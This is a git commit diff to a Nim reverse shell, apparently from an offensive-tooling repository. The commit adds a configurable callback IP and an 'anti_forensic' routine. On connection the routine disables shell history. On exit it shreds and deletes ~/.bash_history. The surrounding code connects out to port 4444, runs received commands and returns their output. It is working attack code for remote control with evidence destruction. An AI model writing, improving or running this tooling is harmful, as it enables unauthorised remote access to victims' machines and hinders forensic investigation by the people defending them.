36a7047bb65fef647997ad5eedd366fc9bf322ca
x64dot <142705403+x64dot@users.noreply.github.com>
2024-08-26 16:47:59 -0400

    Update reverseshell.nim
    Added tiny basic anti forensic function

--- reverseshell.nim
+++ reverseshell.nim
@@ -1,10 +1,36 @@
 import std/net, std/osproc, std/strutils, std/private/ospaths2, std/dirs, std/os
 
+let IP: string = "127.0.0.1" # Change this (obviously)
+
+let anti: bool = true # Make this false, if you don't want to use the anti forensics feature, otherwise keep it true.
+
+
+proc anti_forensic(MY_SOCKET: Socket, finish: bool): void =
+    if not finish:
+
+        MY_SOCKET.send("[+] (First procedure) Starting anti_forensic procedure. \n")
+        MY_SOCKET.send("[NOTE] Please don't CTRL+C just enter exit, to finish the anti_forensic procedure. \n")
+
+        let result1 = execProcess("export HISTSIZE=0") 
+
+        MY_SOCKET.send("[+] First anti_forensic procedure done. \n")
+    else:
+        MY_SOCKET.send("[+] (Last procedure) Finishing the anti_forensic procedure. \n")
+
+        let result2 = execProcess("shred -f -n 3 ~/.bash_history") # Shredding just in case.
+        let result3 = execProcess("rm -f ~/.bash_history")
+
+        MY_SOCKET.send("[+] Last anti_forensic procedure done. \n")
+        
 proc reverse_shell(): void =
+
     try:
         var cd_cond = false
         let socket = newSocket()
-        socket.connect("127.0.0.1",  Port(4444)) # change ip and port(if needed)
+        socket.connect(IP, Port(4444)) # Change the port if needed
+
+        if anti:
+            anti_forensic(socket, false)
 
         while true:
             try:
@@ -35,6 +61,8 @@ proc reverse_shell(): void =
                         socket.send(result_command)
 
                     if command == "exit":
+                        if anti:
+                            anti_forensic(socket, true)
                         break
                 
             except Exception as e:
